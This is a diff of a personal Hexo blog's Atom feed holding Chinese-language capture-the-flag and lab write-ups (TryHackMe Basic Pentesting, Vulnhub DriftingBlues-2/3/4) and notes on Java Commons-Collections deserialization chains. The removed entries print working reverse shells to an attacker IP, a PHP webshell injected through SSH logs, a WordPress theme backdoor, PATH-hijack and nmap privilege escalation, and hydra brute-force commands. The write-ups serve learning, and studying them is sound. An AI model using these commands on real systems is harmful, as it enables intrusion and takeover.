@@ -6,7 +6,7 @@
   <link href="https://ke1nys.github.io/atom.xml" rel="self"/>
   
   <link href="https://ke1nys.github.io/"/>
-  <updated>2023-05-17T09:23:58.690Z</updated>
+  <updated>2023-05-21T09:41:22.268Z</updated>
   <id>https://ke1nys.github.io/</id>
   
   <author>
@@ -17,11 +17,74 @@
   <generator uri="https://hexo.io/">Hexo</generator>
   
   <entry>
+    <title>thm-Basic Pentesting</title>
+    <link href="https://ke1nys.github.io/posts/4f9775c1.html"/>
+    <id>https://ke1nys.github.io/posts/4f9775c1.html</id>
+    <published>2023-05-21T08:35:12.000Z</published>
+    <updated>2023-05-21T09:41:22.268Z</updated>
+    
+    <content type="html"><![CDATA[<p>写这篇文章主要是为了记录一下学习，这个靶机里有好几个知识点是之前没学过的，然后就学习记录一下</p><p>老样子还是先扫一下端口</p><p><img src="../images/image-20230521164057332.png" alt="image-20230521164057332"></p><p>扫出了这些端口</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">22</span><br><span class="line">80</span><br><span class="line">139</span><br><span class="line">445</span><br><span class="line">8009</span><br><span class="line">8080</span><br></pre></td></tr></table></figure><p>接下来访问80端口</p><p><img src="../images/image-20230521164222216.png" alt="image-20230521164222216"></p><p>没收集到啥有用的信息，扫个目录看看</p><p><img src="../images/image-20230521164453614.png" alt="image-20230521164453614"></p><p>发现一个development目录  于是进行访问</p><p><img src="../images/image-20230521164535782.png" alt="image-20230521164535782"></p><p>发现两个文件</p><p>dev.txt</p><p><img src="../images/image-20230521164625273.png" alt="image-20230521164625273"></p><p>j.txt</p><p><img src="../images/image-20230521164734023.png" alt="image-20230521164734023"></p><p>所以我们在 dev 中打开这两个文本文件，我们可以看到消息是关于一些 apache struts 和 2.5.12 版本的，而 j.txt 文件是关于机器内部哈希密码的目录。所以现在让我们考虑一下 Apache struts 2.5.12 版本，我们用 google 搜索了 Apache struts 2.15.12 以找到一些漏洞，我们得到了一个可以利用的 Metasploit 模块，但在尝试之后并没有给我一个连接。</p><p>我们无法从 Metasploit 模块获得反向 shell</p><p>现在让我们回到 Nmap 脚本，结果显示我们打开了 SMB 端口，我们也有 SMB 版本如果 SMB 版本存在漏洞，让我们谷歌一下</p><p>经过一些研究，我们得到了 <strong>Enum4linux—— <em>Enum4linux</em></strong>是一个用于从 Windows 和 <strong>Samba</strong> 系统枚举信息的工具。</p><p>所以现在我们可以运行命令“Enum4linux -a ipaddress”</p><p><img src="../images/image-20230521165356870.png" alt="image-20230521165356870"></p><p>成功找到这两个用户名，这里还有一种方法就是尝试一一下<strong>smb匿名用户登录</strong></p><p><code>smbclient //10.10.245.61/anonymous</code></p><p><img src="../images/image-20230521165706991.png" alt="image-20230521165706991"></p><p>直接匿名登录成功了</p><p><img src="../images/image-20230521165802097.png" alt="image-20230521165802097"></p><p>这也可以成功拿到名字，接下来就是尝试爆破ssh密码了</p><p>使用的是<code>hydra</code>工具  也叫九头蛇</p><p><img src="../images/image-20230521170726504.png" alt="image-20230521170726504"></p><p>使用这个工具，然后爆破出 <code>jan</code>的密码为<code>armando</code></p><p>于是进行登录</p><p><img src="../images/image-20230521170849656.png" alt="image-20230521170849656"></p><p>成功进行登录</p><p><img src="../images/image-20230521171014069.png" alt="image-20230521171014069"></p><p>发现jan用户没有权限查看kay用户目录下的文件，于是我们就尝试收集一些信息来尝试登录kay用户</p><p><img src="../images/image-20230521171101435.png" alt="image-20230521171101435"></p><p>发现存在<code>.ssh</code>文件</p><p>ssh进行免密登录的要求是<strong>私钥</strong>(<code>id_rsa</code>)要在客户段，<strong>公钥</strong>(<code>id_rsa.pub</code>)在服务端</p><p>在谷歌上搜索后我们知道这个 SSH 密钥可以用 John the ripper 破解。因此，让我们尝试破解 SSH 密钥。</p><p>所以首先我们必须找到 ssh2john.py 来转换哈希并将“id_rsa”文件内容作为文本文件复制并保存到我们的计算机，我们必须将文本文件转换为哈希格式你可以使用如图所示的命令在下图中</p><p><img src="../images/image-20230521172330697.png" alt="image-20230521172330697"></p><p>直接使用.ssh里的id_rsa是登不上去的，得需要john进行破解密码</p><p><img src="../images/image-20230521173041417.png" alt="image-20230521173041417"></p><p>这里是因为使用id_rsa受到密码保护，得输入密码才能使用，所以这里就得需要john进行密码的破解</p><p><strong>john的用法就是把需要破解的东西先转为它能识别的样子，然后在进行破解</strong></p><p>最后爆破出来的密码是<code>beeswax</code></p><p><img src="../images/image-20230521173425039.png" alt="image-20230521173425039"></p><p>成功进行登录</p><p><img src="../images/image-20230521173631270.png" alt="image-20230521173631270"></p><p>然后使用sudo -l来进行查看，发现kay用户可以访问所有的sudo命令</p><p><code>sudo su</code>进行提权</p><p><img src="../images/image-20230521173743387.png" alt="image-20230521173743387"></p><p><strong>总结</strong></p><p><strong>这里的学习到了遇到smb协议的时候该怎么办</strong></p><p><strong>还有使用john来破解id_rsa的使用密码</strong></p><p><strong>感觉john是不是啥密码都能进行爆破</strong> </p>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;p&gt;写这篇文章主要是为了记录一下学习，这个靶机里有好几个知识点是之前没学过的，然后就学习记录一下&lt;/p&gt;
+&lt;p&gt;老样子还是先扫一下端口&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;../images/image-20230521164057332.png&quot; alt=&quot;image-2023</summary>
+      
+    
+    
+    
+    
+    <category term="thm-Basic Pentesting" scheme="https://ke1nys.github.io/tags/thm-Basic-Pentesting/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>show-代码执行</title>
+    <link href="https://ke1nys.github.io/posts/2e4c90e3.html"/>
+    <id>https://ke1nys.github.io/posts/2e4c90e3.html</id>
+    <published>2023-05-20T13:06:08.000Z</published>
+    <updated>2023-05-21T14:27:53.570Z</updated>
+    
+    
+    
+    
+    
+    <category term="show-代码执行" scheme="https://ke1nys.github.io/tags/show-%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>java反序列化-cc2+cc4+cc5+cc7</title>
+    <link href="https://ke1nys.github.io/posts/858f6c3d.html"/>
+    <id>https://ke1nys.github.io/posts/858f6c3d.html</id>
+    <published>2023-05-19T13:11:01.000Z</published>
+    <updated>2023-05-21T12:59:04.654Z</updated>
+    
+    <content type="html"><![CDATA[<p>这里的话是导入cc4的maven依赖</p><p><img src="../images/image-20230521192554529.png" alt="image-20230521192554529"></p><h2 id="CC4"><a href="#CC4" class="headerlink" title="CC4"></a>CC4</h2><p>这里cc4和前面的不同是在调用<code>transform</code>方法的不同</p><p><img src="../images/image-20230521194855536.png" alt="image-20230521194855536"></p><p>然后就是接着找谁能调用这个<code>compare</code>方法了</p><p>根据发现这条链子的作者写的文章来看</p><p>入口点是<code>PriorityQueue</code>这个类</p><p><img src="../images/image-20230521195351157.png" alt="image-20230521195351157"></p><p>然后就到<code>heapify()</code></p><p><img src="../images/image-20230521195429690.png" alt="image-20230521195429690"></p><p>然后接着是<code>siftDown</code>函数</p><p><img src="../images/image-20230521195509503.png" alt="image-20230521195509503"></p><p>然后接着是<code>siftDownUsingComparator</code>函数</p><p><img src="../images/image-20230521195535898.png" alt="image-20230521195535898"></p><p>这里的话就和上面的方法对应上了</p><p>这里的话都是在<code>PriorityQueue</code>这个类里边进行调用那么因为<code>comparator</code>参数可控，所以就可以直接调用<code>TransformingComparator.compare()</code>方法了，然后就可以调用这个方法里边的<code>transform</code>方法了</p><p>最终目的都是为了调用到<code>ChainedTransformer.transform</code>方法</p><p>这里的话就会有疑问，就是为什么这里的链子在<strong>cc3</strong>里不能用，<code>PriorityQueue</code>是jdk里的类，那么出问题的肯定不是他，而是<code>TransformingComparator</code>这个类的问题</p><p><img src="../images/image-20230521202532028.png" alt="image-20230521202532028"></p><p><img src="../images/image-20230521202543387.png" alt="image-20230521202543387"></p><p>就是因为cc3里的这个类没有继承<code>serialize</code>所以就不能进行序列化操作，所以问题就出现在这里了</p><p>这里因为啥设的这些参数我这里就不写了  <a href="https://www.bilibili.com/video/BV1NQ4y1q7EU/?spm_id_from=pageDriver&amp;vd_source=bacfffe46b930fda5761b63367eb298c">视频这里有讲</a></p><p><strong>接下来就懒得跟了，就是修改调用<code>transform</code>方法的变式罢了</strong></p><p><img src="../images/image-20221010090837206.png" alt="img"></p><p>就是跟着这张图片来找就行了</p><p>cc链子可以用很多种方法来互相组合来进行调用，就是可以用执行代码和调用<code>transform</code>的方法来进行排列组合掉用</p><p><strong>理论上应该只有1和3受jdk版本影响</strong></p><p><a href="http://miku233.viewofthai.link/2022/10/10/Commons-Collections2%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">这是b站评论大佬写的总结</a></p><p><a href="https://www.bilibili.com/video/BV1NQ4y1q7EU/?spm_id_from=pageDriver&amp;vd_source=bacfffe46b930fda5761b63367eb298c">b站视频</a></p>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;p&gt;这里的话是导入cc4的maven依赖&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;../images/image-20230521192554529.png&quot; alt=&quot;image-20230521192554529&quot;&gt;&lt;/p&gt;
+&lt;h2 id=&quot;CC4&quot;&gt;&lt;a href=&quot;#CC4&quot;</summary>
+      
+    
+    
+    
+    
+    <category term="java反序列化-cc2+cc4+cc5+cc7" scheme="https://ke1nys.github.io/tags/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-cc2-cc4-cc5-cc7/"/>
+    
+  </entry>
+  
+  <entry>
     <title>java-二次反序列化</title>
     <link href="https://ke1nys.github.io/posts/6c257651.html"/>
     <id>https://ke1nys.github.io/posts/6c257651.html</id>
     <published>2023-05-17T08:51:44.000Z</published>
-    <updated>2023-05-17T09:23:58.690Z</updated>
+    <updated>2023-05-17T12:28:35.161Z</updated>
     
     <content type="html"><![CDATA[<p><a href="http://tttang.com/archive/1701/#toc_">二次反序列化</a></p>]]></content>
     
@@ -409,81 +472,6 @@
     
     
     <category term="DASCTF web SU" scheme="https://ke1nys.github.io/tags/DASCTF-web-SU/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>Vulnhub——DriftingBlues-4</title>
-    <link href="https://ke1nys.github.io/posts/f7456a24.html"/>
-    <id>https://ke1nys.github.io/posts/f7456a24.html</id>
-    <published>2023-04-21T12:01:22.000Z</published>
-    <updated>2023-04-27T12:31:51.148Z</updated>
-    
-    <content type="html"><![CDATA[<p>先扫一下c段，发现一下靶机地址</p><p><img src="../images/image-20230427145027282.png" alt="image-20230427145027282"></p><p>然后扫一下端口</p><p><img src="../images/image-20230427145130880.png" alt="image-20230427145130880"></p><p>开了三个端口  先尝试看能否进行ftp登录</p><p><img src="../images/image-20230427145314408.png" alt="image-20230427145314408"></p><p>发现不行，不能匿名登录</p><p>于是查看一下80端口</p><p><img src="../images/image-20230427145452523.png" alt="image-20230427145452523"></p><p>发现源码存在一段base64加密的密文，于是尝试进行解密‘</p><p><img src="../images/image-20230427145606070.png" alt="image-20230427145606070"></p><p>最后解密的到这个路径  然后进行访问··</p><p><img src="../images/image-20230427145659695.png" alt="image-20230427145659695"></p><p>访问得到以下的一些符号，于是进行解密</p><p><img src="../images/image-20230427145930036.png" alt="image-20230427145930036"></p><p><img src="../images/image-20230427150000913.png" alt="image-20230427150000913"></p><p>利用上面的在线网址进行解密，发现存在这个一个图片路径  <code>/iTiS3Cr3TbiTCh.png</code></p><p><img src="../images/image-20230427150102540.png" alt="image-20230427150102540"></p><p>访问之后得到一个二维码，然后进行访问，得到以下的信息</p><p><img src="../images/image-20230427193142028.png" alt="image-20230427193142028"></p><p>于是猜测这几个是用户名，于是尝试进行ssh爆破试试，先将这几个用户名保存为user1.txt</p><p><img src="../images/image-20230427193338239.png" alt="image-20230427193338239"></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hydra -L user1.txt -P /usr/share/wordlists/rockyou.txt ssh://192.168.142.146</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230427193516063.png" alt="image-20230427193516063"></p><p>爆破失败，没有匹配的密码</p><p>于是就尝试爆破一下ftp</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hydra -L user1.txt -P /usr/share/wordlists/rockyou.txt ftp://192.168.142.146</span><br></pre></td></tr></table></figure><p><strong><code>破解出一个</code>FTP<code>登录的用户名和密码：</code>luther/mypics`</strong></p><p><img src="../images/image-20230427194706118.png" alt="image-20230427194706118"></p><p><img src="../images/image-20230427194157405.png" alt="image-20230427194157405"></p><p>成功登入，然后切换到hubert用户下，这里的话可以尝试一下进行ssh登录，先检查这里是否存在<code>.ssh</code></p><p><img src="../images/image-20230427194342023.png" alt="image-20230427194342023"></p><p>没有的话在这里就创建一个，然后就根据ssh登录原理进行伪造</p><p>就是先在kali上生成ssh  公钥和私钥   然后把公钥复制到ftp服务器上，并且命名为<strong><code>authorized_keys</code></strong></p><p>然后在kali上就可以用生成的私钥进行该用户的登录了</p><p><strong>ssh私钥登录步骤</strong></p><p><strong>首先先在<code>kaii</code>本地生成秘钥<code>ssh-keygen</code> 将 <code>id_rsa.pub SSH</code> 公钥文件另存为 <code>authorized_keys</code></strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh-keygen -t rsa</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230427194943659.png" alt="image-20230427194943659"></p><p>然后修改公钥的名字</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mv id_rsa.pub authorized_keys</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230427195031935.png" alt="image-20230427195031935"></p><p>然后在ftp服务器上使用put命令，将<code>authorized_keys</code>传到服务器上</p><p><img src="../images/image-20230427195213888.png" alt="image-20230427195213888"></p><p>成功传进去了 这里的话  路径得一致</p><p><img src="../images/image-20230427195251240.png" alt="image-20230427195251240"></p><p>那么登录ftp的时候，也必须在这个kali路径下登录</p><p>那么现在就可以对hubert进行ssh私钥登录了</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">chmod 400 id_rsa</span><br><span class="line">ssh hubert@192.168.142.146 -i id_rsa</span><br></pre></td></tr></table></figure><p>然后和Vulnhub DriftingBlues-3一样的提权方法，下面就不多赘述了</p>]]></content>
-    
-    
-      
-      
-    <summary type="html">&lt;p&gt;先扫一下c段，发现一下靶机地址&lt;/p&gt;
-&lt;p&gt;&lt;img src=&quot;../images/image-20230427145027282.png&quot; alt=&quot;image-20230427145027282&quot;&gt;&lt;/p&gt;
-&lt;p&gt;然后扫一下端口&lt;/p&gt;
-&lt;p&gt;&lt;img src=&quot;..</summary>
-      
-    
-    
-    
-    
-    <category term="Vulnhub DriftingBlues-4" scheme="https://ke1nys.github.io/tags/Vulnhub-DriftingBlues-4/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>DriftingBlues-3</title>
-    <link href="https://ke1nys.github.io/posts/a7ffa01f.html"/>
-    <id>https://ke1nys.github.io/posts/a7ffa01f.html</id>
-    <published>2023-04-21T10:05:51.000Z</published>
-    <updated>2023-04-26T13:05:32.228Z</updated>
-    
-    <content type="html"><![CDATA[<p>还是先扫一下c段</p><p><img src="../images/image-20230421180643418.png" alt="image-20230421180643418"></p><p>进行端口扫描</p><p><img src="../images/image-20230421180739563.png" alt="image-20230421180739563"></p><p>然后进行访问</p><p><img src="../images/image-20230421180934567.png" alt="image-20230421180934567"></p><p>进行访问</p><p><img src="../images/image-20230421181000421.png" alt="image-20230421181000421"></p><p><img src="../images/image-20230421181408827.png" alt="image-20230421181408827"></p><p><img src="../images/image-20230421181349395.png" alt="image-20230421181349395"></p><p>访问给的<code>/littlequeenofspades.html</code>  </p><p><img src="../images/image-20230421182129099.png" alt="image-20230421182129099"></p><p>然后查看源码，发现一段base64编码的代码，然后进行解码发现</p><p><img src="../images/image-20230421182611129.png" alt="image-20230421182611129"></p><p>于是进行访问</p><p><img src="../images/image-20230421182643602.png" alt="image-20230421182643602"></p><p>发现这是个ssh日志记录   可以尝试进行日志里写后门</p><p><strong>看到出现<code>ssh auth log --&gt; ssh</code>身份验证日志，并且注意到登录用户名显示在日志中，也就是说如果我们使用ssh登陆时，将用户名写成一句话就可以写马进日志中</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">使用命令：ssh &#x27;&lt;?php system($_GET[&quot;a&quot;]);?&gt;&#x27;@192.168.142.142</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230421183202692.png" alt="image-20230421183202692"></p><p>然后尝试看马有没有写进去</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.142.144/adminsfixit.php?a=whoami</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230421183448490.png" alt="image-20230421183448490"></p><p>发现可以进行命令执行  然后进行nc 反弹shell</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">kali开启监听：nc -lvnp 4444</span><br><span class="line">?xa=nc -e /bin/bash 192.168.142.129 4444</span><br><span class="line">python -c &#x27;import pty; pty.spawn(&quot;/bin/bash&quot;)&#x27; #交互shell</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230421184535768.png" alt="image-20230421184535768"></p><p>反弹成功，然后进行shell交互</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c &#x27;import pty; pty.spawn(&quot;/bin/bash&quot;)&#x27; </span><br></pre></td></tr></table></figure><p><img src="../images/image-20230421184638397.png" alt="image-20230421184638397"></p><p>发现还是存在<code>.ssh</code>  文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">直接在目标机生成一个公钥：ssh-keygen -t rsa</span><br><span class="line">将生成的私钥保存到：/home/robertj/.ssh/id_rsa </span><br><span class="line">将 SSH 公钥文件重命名为 authorized_keys ，用于 SSH 登陆认证</span><br><span class="line">cat id_rsa.pub &gt; authorized_keys</span><br><span class="line">然后将私钥复制到本机</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230421185302902.png" alt="image-20230421185302902"></p><p>一步一步跟着搞，然后就生成了密钥和私钥</p><p><a href="https://blog.csdn.net/Dontla/article/details/120902725">SSH公钥原理（密钥，秘钥，私钥）</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh robertj@192.168.142.144 -i id_ssh</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230421194215924.png" alt="image-20230421194215924"></p><p><img src="../images/image-20230421194359077.png" alt="image-20230421194359077"></p><p>suid  发现了一个getinfo可以进行使用</p><p><img src="../images/image-20230421194544476.png" alt="image-20230421194544476"></p><p>根据上面输出的结果，可以推测这个程序中执行了</p><p><code>ip addr, cat /etc/hosts, uname -a</code><br>因此，在这种情况下，我们可以在环境变量 PATH 中提供一个目录 (/tmp)，并创建一个 ip<br>或者 cat 文件，用于劫持命令，执行我们自定义的二进制文件就可以提权</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">export PATH=/tmp/:$PATH</span><br><span class="line">cd /tmp</span><br><span class="line">echo &#x27;/bin/bash&#x27; &gt; ip</span><br><span class="line">chmod +x ip</span><br><span class="line">/usr/bin/getinfo</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230421195813143.png" alt="image-20230421195813143"></p><p>成功提权</p><p><img src="../images/image-20230421195838680.png" alt="image-20230421195838680"></p><p><strong>本节通过信息收集获取到敏感文件，进而 SSH 日志写后门获取 shell，然后信息收集</strong><br><strong>获取 ssh 私钥获取 shell，最后利用 suid-命令劫持提权</strong></p><p><strong>信息收集</strong><br><strong>Base64 解码</strong><br><strong>ssh日志写后门获取 shell</strong><br><strong>信息收集获取 ssh 私钥获取 shell</strong><br><strong>suid-命令劫持提权</strong></p>]]></content>
-    
-    
-      
-      
-    <summary type="html">&lt;p&gt;还是先扫一下c段&lt;/p&gt;
-&lt;p&gt;&lt;img src=&quot;../images/image-20230421180643418.png&quot; alt=&quot;image-20230421180643418&quot;&gt;&lt;/p&gt;
-&lt;p&gt;进行端口扫描&lt;/p&gt;
-&lt;p&gt;&lt;img src=&quot;../images/</summary>
-      
-    
-    
-    
-    
-    <category term="DriftingBlues-3" scheme="https://ke1nys.github.io/tags/DriftingBlues-3/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>Vulnhub——DriftingBlues-2</title>
-    <link href="https://ke1nys.github.io/posts/1e26cf11.html"/>
-    <id>https://ke1nys.github.io/posts/1e26cf11.html</id>
-    <published>2023-04-21T08:07:27.000Z</published>
-    <updated>2023-04-26T13:05:32.231Z</updated>
-    
-    <content type="html"><![CDATA[<p>(tmd,配置个网卡配置半天)</p><p>还是先扫一下c段</p><p><img src="../images/image-20230421165628676.png" alt="image-20230421165628676"></p><p>然后进行端口扫描</p><p><img src="../images/image-20230421170024112.png" alt="image-20230421170024112"></p><p>扫描发现了三个端口  多出来的21端口是ftp服务，那么我们就可以去尝试一下，看能不能匿名登录</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ftp 192.168.142.142</span><br><span class="line">用户名：anonymous</span><br><span class="line">密码：空</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230421170215786.png" alt="image-20230421170215786"></p><p>成功进行登录</p><p>里面只有一张图片，没啥用，然后进行端口扫描</p><p><img src="../images/image-20230421170728331.png" alt="image-20230421170728331"></p><p><img src="../images/image-20230421170744040.png" alt="image-20230421170744040"></p><p>只访问这个blog的话是wordpress框架的</p><p>然后尝试进行使用该框架的扫描工具  <code>wpscan</code>进行扫描</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wpscan --url http://192.168.142.142/blog/ -e u</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230421171032382.png" alt="image-20230421171032382"></p><p>扫到一个用户   于是尝试进行密码破解</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wpscan --url http://192.168.142.142/blog/ --passwords /usr/share/wordlists/rockyou.txt --usernames albert</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230421171505615.png" alt="image-20230421171505615"></p><p>爆破到密码了</p><p><img src="../images/image-20230421171908888.png" alt="image-20230421171908888"></p><p>扫到后台了，于是尝试进行登录</p><p><img src="../images/image-20230421172047872.png" alt="image-20230421172047872"></p><p>得先进行域名的dns配置好</p><p><img src="../images/image-20230421172231456.png" alt="image-20230421172231456"></p><p>进行修改成功</p><p><img src="../images/image-20230421172249279.png" alt="image-20230421172249279"></p><p><img src="../images/image-20230421172328984.png" alt="image-20230421172328984"></p><p>成功进入后台，那么我们就得寻找可以进行漏洞利用的地方了</p><p><img src="../images/59383e44fb3e4b81a094c70900c7777f.png" alt="img"></p><p>这就是漏洞利用的点</p><p>修改后的代码</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$</span><span class="language-bash">ip=<span class="string">&quot;192.168.142.129&quot;</span>;</span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">port=3333;</span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">sock=fsockopen(<span class="variable">$ip</span>, <span class="variable">$port</span>);</span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">descriptorspec=array(</span></span><br><span class="line">0=&gt;$sock,</span><br><span class="line">1=&gt;$sock,</span><br><span class="line">2=&gt;$sock</span><br><span class="line">);</span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">process=proc_open(<span class="string">&#x27;/bin/sh&#x27;</span>, <span class="variable">$descriptorspec</span>, <span class="variable">$pipes</span>);</span></span><br><span class="line"><span class="meta prompt_">proc_close($</span><span class="language-bash">process);</span></span><br></pre></td></tr></table></figure><p><img src="../images/image-20230421173119250.png" alt="image-20230421173119250"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://driftingblues.box/blog/index.php/xxx</span><br></pre></td></tr></table></figure><p>然后访问一个不存在的页面，就可以直接弹shell了</p><p><img src="../images/image-20230421173724289.png" alt="image-20230421173724289"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">使用命令：python -c &#x27;import pty; pty.spawn(&quot;/bin/bash&quot;)&#x27;</span><br></pre></td></tr></table></figure><p>然后尝试进行提权</p><p>进入/home/freddie后发现存在<strong>.ssh</strong>文件</p><p><img src="../images/image-20230421173917976.png" alt="image-20230421173917976"></p><p><img src="../images/image-20230421174018099.png" alt="image-20230421174018099"></p><p>发现存在私钥和公钥</p><p>那么我们就可以尝试进行ssh私钥登录  </p><p><img src="../images/image-20230421175335627.png" alt="image-20230421175335627"></p><p>把私钥进行复制过来，然后给权限，然后进行私钥登录</p><p><img src="../images/image-20230421175515512.png" alt="image-20230421175515512"></p><p>直接进行私钥登录了</p><p><img src="../images/image-20230421175554303.png" alt="image-20230421175554303"></p><p>拿到第一个flag</p><p><img src="../images/image-20230421175631172.png" alt="image-20230421175631172"></p><p>猜测是用namp进行提权，用的是script来运行脚本</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;os.execute(&#x27;/bin/bash&#x27;)&quot; &gt; getshell</span><br><span class="line">sudo nmap --script=getshell</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230421175735156.png" alt="image-20230421175735156"></p><p>然后就变成了root用户了</p><p><img src="../images/image-20230421175816747.png" alt="image-20230421175816747"></p><p>拿到了全部的flag了</p><p><strong>总结</strong></p><p><strong>这次出现了<code>21</code> 端口匿名登入以及<code>ssh</code> 私钥登入 （新知识点）</strong></p>]]></content>
-    
-    
-      
-      
-    <summary type="html">&lt;p&gt;(tmd,配置个网卡配置半天)&lt;/p&gt;
-&lt;p&gt;还是先扫一下c段&lt;/p&gt;
-&lt;p&gt;&lt;img src=&quot;../images/image-20230421165628676.png&quot; alt=&quot;image-20230421165628676&quot;&gt;&lt;/p&gt;
-&lt;p&gt;然后进行端口扫描&lt;/p</summary>
-      
-    
-    
-    
-    
-    <category term="Vulnhub  DriftingBlues-2" scheme="https://ke1nys.github.io/tags/Vulnhub-DriftingBlues-2/"/>
     
   </entry>
   
